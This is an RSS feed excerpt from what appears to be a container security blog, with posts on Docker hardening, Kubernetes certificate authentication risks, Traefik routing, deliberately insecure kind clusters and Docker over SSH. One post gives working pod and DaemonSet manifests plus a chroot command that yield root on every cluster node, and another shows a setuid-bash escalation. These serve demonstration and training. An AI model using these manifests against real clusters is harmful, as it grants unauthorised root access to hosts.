&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;If you want to prevent your container processes from gaining additional privileges
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Basically if your container runs as a non-root user (as all good containers should) this can be used to stop processes inside the container from getting additional privileges.&lt;/p&gt;

&lt;p&gt;Here’s a practical example.  Say we have a Dockerfile that looks like this&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM ubuntu:18.04

RUN cp /bin/bash /bin/setuidbash &amp;amp;&amp;amp; chmod 4755 /bin/setuidbash

RUN useradd -ms /bin/bash newuser

USER newuser

CMD [&quot;/bin/bash&quot;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We’ve got another bash shell which we’ve made setuid root, meaning that it can be used to get root level privileges (albeit still constrained by Docker’s default capability set).&lt;/p&gt;

&lt;p&gt;If we build this Dockerfile as &lt;code class=&quot;highlighter-rouge&quot;&gt;nonewpriv&lt;/code&gt; then run&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run -it nonewpriv
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;we get landed into a bash shell as the &lt;code class=&quot;highlighter-rouge&quot;&gt;newuser&lt;/code&gt; user.  Running &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/setuidbash -p&lt;/code&gt; at this point will make us root demonstrating that we’ve effectively escalated our privileges inside the container.&lt;/p&gt;

&lt;p&gt;Now if we try launching the same container, but add the no-new-privileges flag&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run -it --security-opt=no-new-privileges:true nonewpriv
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;when we run &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/setuidbash -p&lt;/code&gt; our escalation to root doesn’t work and our new bash shell stays running as the &lt;code class=&quot;highlighter-rouge&quot;&gt;newuser&lt;/code&gt; user, foiling our privilege escalation attempt :)&lt;/p&gt;

&lt;p&gt;So, this option is one worth considering if you’ve got containers being launched as a non-root user and you want to reduce the risk of malicious processes in the container trying to get additional rights.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Edit&lt;/strong&gt; Just to add based on conversations on twitter following this post, it’s worth noting that you can achieve the same effect as &lt;code class=&quot;highlighter-rouge&quot;&gt;no-new-privileges&lt;/code&gt;, if you want to run your container as a non-root user, by doing &lt;code class=&quot;highlighter-rouge&quot;&gt;cap-drop=all&lt;/code&gt; as part of the run statement.  This has a similar effect in stopping the contained processes from gaining any Linux capabilities, and if your workloads support it, is a great idea for hardening your containers.&lt;/p&gt;
</description>
				<pubDate>Sat, 01 Jun 2019 10:10:39 +0100</pubDate>
				<link>/blog/2019/06/01/docker-capabilities-and-no-new-privs/</link>
				<guid isPermaLink="true">/blog/2019/06/01/docker-capabilities-and-no-new-privs/</guid>
			</item>
		
			<item>
				<title>Certificate Authentication and the Golden Ticket at the heart of Kubernetes</title>
				<description>&lt;h2 id=&quot;authentication-in-kubernetes&quot;&gt;Authentication in Kubernetes&lt;/h2&gt;

&lt;p&gt;Authentication is an interesting area of Kubernetes security.  The built-in options for authenticating users to clusters are fairly limited. Basic Authentication and Token Authentication are generally considered to be a bad idea as they rely on cleartext credentials stored in files on disk on the API server(s) and require an API server restart when changing their contents, which is not exactly a scalable solution.&lt;/p&gt;

&lt;p&gt;This leaves client certificate authentication as the main default authentication mechanism and one that I see enabled in pretty much every cluster I look at.  Client certificate authentication also gets used for component to component authentication (e.g. to allow the Kubelet to authenticate to the API server).&lt;/p&gt;

&lt;h2 id=&quot;client-certificate-authentication&quot;&gt;Client Certificate Authentication&lt;/h2&gt;

&lt;p&gt;Client certificate authentication, however, presents it’s own set of security concerns and challenges. Securely managing the keys associated with certificate authorities can be a significant challenge, and with many clusters using 3 or more distinct CAs (before we even start talking about add-ons like istio) there’s quite a bit of scope for problems.  Kubernetes clusters will typically keep their CA certificates and keys online (i.e. they’re stored in the clear on disk on the API servers) as opposed to traditional PKI setups where a root CA key would never be held on a production system in the clear. In those more traditional setups the keys would either be stored in an HSM or kept offline and only used where needed to sign subordinate certificates.&lt;/p&gt;

&lt;h2 id=&quot;ca-keys-or-golden-tickets&quot;&gt;CA Keys or “Golden Tickets”&lt;/h2&gt;

&lt;p&gt;You can then combine that with the problem that CA keys tend to have a very long validity period (from a review of common cluster installers, 10 years is typical) and you realise that if an attacker can get access to those CA key files they can effectively have a “golden ticket” to maintain unauthorised access to the cluster for a very long time, as the CA keys can be used to create new user identities whenever they like.  This unauthorised access can happen in a number of ways, anything from a key mistakenly checked into source code control, or an attacker who can mount a volume from an API server component, could lead to leakage of a CA key.&lt;/p&gt;

&lt;p&gt;One reason these attacks are possible is due to an important (and somewhat unintuitive) aspect of Kubernetes authentication which is that in general Kubernetes has no concept of a user database, it relies on the identity provided by the authentication mechanism, to determine who the user is and then matches this to RBAC bindings to provide rights to that user.&lt;/p&gt;

&lt;p&gt;In the case of certificate authentication this is done by looking at the &lt;code class=&quot;highlighter-rouge&quot;&gt;CN&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;O&lt;/code&gt; fields of the client certificate as it’s presented to the API server.  A certificate which is signed by the appropriate CA is then given whatever rights that user identity correlates to.&lt;/p&gt;

&lt;p&gt;So an attacker with access to the CA key can just mint new user identities whenever it likes, and Kubernetes won’t complain, even if there’s another certificate with that identity.&lt;/p&gt;

&lt;h2 id=&quot;certificate-revocation-or-lack-thereof&quot;&gt;Certificate revocation (or lack thereof)&lt;/h2&gt;

&lt;p&gt;Another facet of client certificate authentication in Kubernetes which makes this problematic is that Kubernetes has no concept of certificate revocation.  So an attacker who mints a privileged client cert can continue to use this as long as the CA key doesn’t change, and as mentioned earlier, these are usually valid for 10 years.&lt;/p&gt;

&lt;p&gt;The only way to prevent this persistent access is to redeploy the entire certificate authority which, depending on the size of the cluster, could be tricky.&lt;/p&gt;

&lt;h2 id=&quot;so-how-many-clusters-could-this-affect&quot;&gt;So how many clusters could this affect?&lt;/h2&gt;

&lt;p&gt;One other facet of the way that Kubernetes is being commonly deployed which could make this an issue going forward is the number of clusters which have their API server components exposed on the Internet.  It’s relatively easy to search for Kubernetes clusters via search engines like Censys as they have common strings in their certificates.  A recent check showed that there are now over a million likely Kubernetes cluster servers on-line…&lt;/p&gt;

&lt;p&gt;It’s worth noting that these problems are more of a concern in unmanaged Kubernetes clusters, where the operator is responsible for CA management.  The main managed clusters (GKE, AKS and EKS) don’t expose the CA keys to users of the cluster and GKE also offers the option to disable client certificate authentication all together, which is good as it’s not just a problem with CA keys, user kubeconfig files with client keys can also be a risk.&lt;/p&gt;
</description>
				<pubDate>Tue, 16 Apr 2019 12:10:39 +0100</pubDate>
				<link>/blog/2019/04/16/kubernetes-certificate-auth-golden-key/</link>
				<guid isPermaLink="true">/blog/2019/04/16/kubernetes-certificate-auth-golden-key/</guid>
			</item>
		
			<item>
				<title>The most pointess Kubernetes command ever</title>
				<description>&lt;p&gt;Coming up for 4 years ago (a lifetime in Container land) Ian Miell wrote about &lt;a href=&quot;https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/&quot;&gt;“The most pointless Docker Command Ever”&lt;/a&gt;.  This was a docker command that you could run and it would return you back as root on your host.&lt;/p&gt;

&lt;p&gt;Far from being useless, this is one of my favourite Docker commands, either to demonstrate to people why things like mounting &lt;code class=&quot;highlighter-rouge&quot;&gt;docker.sock&lt;/code&gt; inside a container is dangerous, or for using as part of security tests where I can create containers, and I’d like to get to the underlying host easily.&lt;/p&gt;

&lt;p&gt;I was thinking today, I wonder what this would look like in Kubernetes…? So I create a quick pod YAML file to test.  You can use this YAML to demonstrate the risks of allowing users to create pods on your cluster, without PodSecurityPolicy setup (of course, I’m sure &lt;strong&gt;all&lt;/strong&gt; production clusters have a PodSecurityPolicy….. right?).&lt;/p&gt;

&lt;p&gt;The YAML is pretty simple, it basically creates a privileged container based on the &lt;code class=&quot;highlighter-rouge&quot;&gt;busybox&lt;/code&gt; image and sets it in an endless loop, waiting for a connection, whilst also setting up the appropriate security flags to make the pod privileged, and also mounting the root directory of the underlying host into &lt;code class=&quot;highlighter-rouge&quot;&gt;/host&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: v1
kind: Pod
metadata:
  name: noderootpod
  labels:
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: noderootpod
    image: busybox
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;--&quot; ]
    args: [ &quot;while true; do sleep 30; done;&quot; ]
  volumes:
  - name: noderoot
    hostPath:
      path: /
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once you’ve got that as a file called say “noderoot.yml” , just run &lt;code class=&quot;highlighter-rouge&quot;&gt;kubectl create -f noderoot.yml&lt;/code&gt;
then, to get root on your Kubernetes node you just need to run&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;kubectl exec -it noderootpod chroot /host&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;and Hey Presto, you’ll be the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; user on the host :)&lt;/p&gt;

&lt;p&gt;Of course, you’re thinking, “that only does one random node” and you’d be right.  To get root shells on all the nodes, what you need is a DaemonSet, which will schedule a Pod onto every node in the cluster.&lt;/p&gt;

&lt;p&gt;The YAML for this is a little more complex, but the essence is the same&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: noderootpod
  labels:
spec:
  selector:
    matchLabels:
      name: noderootdaemon
  template:
    metadata:
      labels:
        name: noderootdaemon
    spec:
      tolerations:
      - key: node-role.kubernetes.io/master
        effect: NoSchedule
      hostNetwork: true
      hostPID: true
      hostIPC: true
      containers:
      - name: noderootpod
        image: busybox
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: noderoot
        command: [ &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;--&quot; ]
        args: [ &quot;while true; do sleep 30; done;&quot; ]
      volumes:
      - name: noderoot
        hostPath:
          path: /
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once that’s run just do a &lt;code class=&quot;highlighter-rouge&quot;&gt;kubectl get po&lt;/code&gt; to see your list of pods to choose from, and run the same &lt;code class=&quot;highlighter-rouge&quot;&gt;chroot /host&lt;/code&gt; command on one to get that root on the host feeling…&lt;/p&gt;

&lt;p&gt;If you’ve made it all the way to the bottom of this post, I’ll briefly pimp out my &lt;a href=&quot;https://www.blackhat.com/us-19/training/schedule/index.html#mastering-container-security-140201547156094&quot;&gt;Mastering Container Security&lt;/a&gt; course, which I’m running at Black Hat USA this year, where we’ll be covering this and much much more container security goodness :)&lt;/p&gt;
</description>
				<pubDate>Mon, 01 Apr 2019 19:10:39 +0100</pubDate>
				<link>/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/</link>
				<guid isPermaLink="true">/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/</guid>
			</item>
		
			<item>
				<title>Traefiking in Presentations</title>
				<description>&lt;p&gt;One of the common tasks in a containerized environment, where you could be running multiple applications in containers on a single host, is “what’s the best way to route traffic to my web applications”?&lt;/p&gt;

&lt;p&gt;Whilst you could expose each application on a dedicated port, that’s not a great user experience.  A better idea is to make use of a reverse proxy (a.k.a ingress in Kubernetes-land) to route traffic to the correct container based on a set of rules.&lt;/p&gt;

&lt;p&gt;Recently I noticed that &lt;a href=&quot;https://traefik.io/&quot;&gt;traefik&lt;/a&gt; had a new version on the horizon, so I decided to give it a spin.&lt;/p&gt;

&lt;p&gt;My use case is pretty straightforward.  I’ve got a number of presentations that I’ve given over the last couple of years which are all bundled as Docker images (using &lt;a href=&quot;https://github.com/dploeger/jekyll-revealjs&quot;&gt;jekyll-revealjs&lt;/a&gt;). I like this method of writing presentations, as it lets me create the content in a series of markdown files, which are nice and easy to edit, and then bundle up the resulting presentation as a web application runnning in a Docker image, meaning it can be delivered from any Internet connected host.&lt;/p&gt;

&lt;p&gt;Traefik configuration can be done using a Docker compose file, where labels in the service definition let traefik know how to route specific requests.  My planned layout was just to specify hosts on my domain (pwndland.uk) for each presentation.&lt;/p&gt;

&lt;p&gt;The main “Gotcha” I encountered when writing the configuration below was that I needed to explicitly specify the port on the container network that was hosting the application using &lt;code class=&quot;highlighter-rouge&quot;&gt;expose&lt;/code&gt; statements, otherwise traefik wouldn’t know how to route traffic.&lt;/p&gt;

&lt;p&gt;One note from a security perspective if you’re making use of Traefik, is that it&lt;/p&gt;

&lt;p&gt;The configuration for my presentations ended up looking as below, and the presentations should be available on these URLS&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://ltdh.pwndland.uk/#/&quot;&gt;Le Tour Du Hack Presentation - A security Persons life or, “The art of being Cassandra”&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://kube.pwndland.uk/#/&quot;&gt;44Con March 2019 - Cloudy Clusters Catastrope?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://container-runtime.pwndland.uk/#/&quot;&gt;Cloud Native Glasgow - Fistful of Container Runtimes&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://docker.pwndland.uk/#/&quot;&gt;BSides London 2016 - Docker - Security Myths, Security Legends&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;version: '3'

services:
  reverse-proxy:
    image: traefik:v2.0 # The official v2.0 Traefik docker image
    command: --providers.docker # Enables the web UI and tells Traefik to listen to docker
    ports:
      - &quot;80:80&quot;     # The HTTP port
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock # So that Traefik can listen to the Docker events
  ltdh:
    image: raesene/ltdh_presentation
    expose:
      - &quot;4000&quot;
    labels:
      - &quot;traefik.http.routers.ltdh.rule=Host(`ltdh.pwndland.uk`)&quot;
      - &quot;traefik.domain=`pwndland.uk`&quot;
  kube:
    image: raesene/kube2019pres
    expose:
      - &quot;4000&quot;
    labels:
      - &quot;traefik.http.routers.kube.rule=Host(`kube.pwndland.uk`)&quot;
      - &quot;traefik.domain=`pwndland.uk`&quot;
  container-runtime:
    image: raesene/container-runtime-presentation
    expose:
      - &quot;4000&quot;
    labels:
      - &quot;traefik.http.routers.container-runtime.rule=Host(`container-runtime.pwndland.uk`)&quot;
      - &quot;traefik.domain=`pwndland.uk`&quot;
  docker:
    image: raesene/bsides_presentation
    expose:
      - &quot;4000&quot;
    labels:
      - &quot;traefik.http.routers.docker.rule=Host(`docker.pwndland.uk`)&quot;
      - &quot;traefik.domain=`pwndland.uk`&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
				<pubDate>Mon, 25 Mar 2019 20:10:39 +0000</pubDate>
				<link>/blog/2019/03/25/traefiking-in-presentations/</link>
				<guid isPermaLink="true">/blog/2019/03/25/traefiking-in-presentations/</guid>
			</item>
		
			<item>
				<title>Kind of Insecure Test Clusters</title>
				<description>&lt;p&gt;One of the great things about the Kubernetes ecosystem is all the new projects that come out on a regular basis to help do various things (keeping up with them can be a challenge, of course).&lt;/p&gt;

&lt;p&gt;For a while I’ve been looking for a way to quickly spin up test clusters that I can use in the container security training course I deliver.  I’ve got some automation with Ansible and Kubeadm which works, but still involves multiple VMs per cluster, which is a bit heavy when you start wanting one per person on a 20 person course.&lt;/p&gt;

&lt;p&gt;So when I heard about &lt;a href=&quot;https://kind.sigs.k8s.io/&quot;&gt;kind&lt;/a&gt; on an episode of Heptio’s &lt;a href=&quot;https://www.youtube.com/playlist?list=PLvmPtYZtoXOENHJiAQc6HmV2jmuexKfrJ&quot;&gt;TGIK&lt;/a&gt; I thought this looked like a really cool tool which might fit the bill, as it lets you spin up Kubernetes clusters inside Docker containers, making it easy for several distinct clusters to live on a single VM.&lt;/p&gt;

&lt;p&gt;Kind is in a relatively early stage of development at the moment with their 0.1 release having come out in January, but it works pretty well.  At base when you run it, it’ll bring up a cluster with the kubeadm default configuration options, which are pretty good from a security perspective these days.&lt;/p&gt;

&lt;p&gt;What I wanted to do however, is modify those to add specific security weaknesses for demonstration purposes.&lt;/p&gt;

&lt;p&gt;Kind supports a &lt;code class=&quot;highlighter-rouge&quot;&gt;--config&lt;/code&gt; option which lets you customize the cluster as you bring it up.  It took a little while for me to work out the correct syntax (thanks to &lt;a href=&quot;https://twitter.com/BenTheElder&quot;&gt;@BenTheElder&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/mauilion&quot;&gt;@mauillon&lt;/a&gt; for all the help pointing me in the right direction), but once you’ve got the basics it’s not too hard.&lt;/p&gt;

&lt;p&gt;The customization is based on the Kubeadm API with a key difference that the customized values need placed in quotes.&lt;/p&gt;

&lt;p&gt;To provide a concrete example, the config below will create a cluster with the insecure port running on the API server&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kind: Config
apiVersion: kind.sigs.k8s.io/v1alpha2
nodes:
# the control plane node config
- role: control-plane
  # patch the generated kubeadm config with some extra settings
  kubeadmConfigPatches:
  - |
    apiVersion: kubeadm.k8s.io/v1beta1
    kind: ClusterConfiguration
    metadata:
      name: config
    apiServer:
      extraArgs:
        # Here the values must be in quotes, unlike the Kubeadm API examples
        insecure-bind-address: &quot;0.0.0.0&quot;
        insecure-port: &quot;8080&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once you’ve got kind installed and this is present as a YAML file you can just run&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;kind --config insecure-port.yaml --name insecure create cluster&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;and kind will create your cluster node for you.  Once it’s up it’s worth noting that the insecure port won’t be visible on the main interface of your VM but will be listening on the &lt;code class=&quot;highlighter-rouge&quot;&gt;docker0&lt;/code&gt; interface.&lt;/p&gt;

&lt;p&gt;So you can get the IP address of that interface from &lt;code class=&quot;highlighter-rouge&quot;&gt;docker inspect insecure-control-plane&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;and then check to confirm that the insecure API is open with something like the below (assuming that the IP address it’s using is &lt;code class=&quot;highlighter-rouge&quot;&gt;172.17.0.3&lt;/code&gt;)&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;curl http://172.17.0.3:8080/&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;I’ve started creating some sample configurations for some of the common insecure configurations you can see in Kubernetes clusters and putting them up on Github &lt;a href=&quot;https://github.com/raesene/kind-of-insecure&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
</description>
				<pubDate>Mon, 04 Mar 2019 20:10:39 +0000</pubDate>
				<link>/blog/2019/03/04/kind-of-insecure-test-clusters/</link>
				<guid isPermaLink="true">/blog/2019/03/04/kind-of-insecure-test-clusters/</guid>
			</item>
		
			<item>
				<title>Docker 18.09 - Making WSL that much easier</title>
				<description>&lt;p&gt;After a little delay Docker 18.09 got it’s final release this week.  This is a release I’ve been looking forward to for a while now, as it’s got a couple of cool new features, which should help in day-to-day usage of Docker.&lt;/p&gt;

&lt;p&gt;The main one is the incorporation of remote connections to Docker Engine instances via SSH.  This means that, if you want to connect to a remote Docker Engine instance, instead of having to setup TLS certificate and modifying the configuration at the server-side, you can simply make a change on the client-side configuration and get easy remote access!&lt;/p&gt;

&lt;p&gt;One of the places this is most useful is with WSL.  To take the basic case, say you’ve got a Linux VM on your host and you’d like to use WSL for Docker development and administration.  First up you’ll need to install the Docker client in WSL.  Fortunately another change that came along with 18.09 makes this easier for you.  There’s a new Client only deb file so you can just install that, rather than installing the server-side engine components.&lt;/p&gt;

&lt;p&gt;First step is to follow the &lt;a href=&quot;https://docs.docker.com/install/linux/docker-ce/ubuntu/&quot;&gt;Docker-CE installation instructions&lt;/a&gt; down to the point of installing Docker, then instead of the usual &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo apt install -y docker-ce&lt;/code&gt; do&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt install -y docker-ce-cli
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we need to tell our client where to connect.  For this we just need to modify the &lt;code class=&quot;highlighter-rouge&quot;&gt;DOCKER_HOST&lt;/code&gt; environment variable.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DOCKER_HOST=ssh://YOUR_HOSTNAME_OR_IP_HERE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once you’ve got that configured, assuming that both client and server are running 18.09 or higher, things should just work!&lt;/p&gt;

&lt;p&gt;A couple of tips to make things smoother :-&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;This works best if your usernames are the same on both client and host, as SSH will assume that that’s the username to use.  You can also configure &lt;code class=&quot;highlighter-rouge&quot;&gt;.ssh/config&lt;/code&gt; to specify what username to use, so as to avoid having to type it in every time.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;If you’re using password based login for the remote server, you’re going to get prompted for the password a lot, which is kind of annoying.  The best approach here is to configure SSH key based login and run an SSH agent so you only need to enter a passphrase once.  This is in general a much nicer way to do admin for systems over SSH, so well worth setting up.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;
</description>
				<pubDate>Sun, 11 Nov 2018 14:10:39 +0000</pubDate>
				<link>/blog/2018/11/11/Docker-18-09-SSH/</link>
				<guid isPermaLink="true">/blog/2018/11/11/Docker-18-09-SSH/</guid>
			</item>
		
	</channel>
</rss>
